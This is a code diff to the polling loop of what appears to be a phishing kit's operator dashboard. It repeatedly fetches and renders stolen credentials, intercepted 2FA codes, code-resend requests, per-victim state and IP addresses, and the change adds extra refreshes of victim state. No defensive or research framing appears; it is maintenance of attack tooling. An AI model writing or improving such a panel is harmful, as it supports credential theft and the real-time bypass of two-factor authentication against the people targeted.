@@ -946,13 +946,7 @@
             loadVictimState();
         }
         
-        loadData();
-        
-        let lastCredsLength = 0;
-        let last2faLength = 0;
-        let lastResendLength = 0;
-        let lastVictimStatus = '';
-        let lastIpsLength = 0;
+loadData();
         
         setInterval(async () => {
             const [credsRes, codesRes, resendRes, stateRes, ipsRes] = await Promise.all([
@@ -970,7 +964,10 @@
             const ips = await ipsRes.json();
             
             renderAll(creds, codes, resends, state, ips);
+            loadVictimState();
         }, 1500);
+        
+        loadVictimState();
         
         function filterCredentials() {
             const search = document.getElementById('searchCreds').value.toLowerCase();
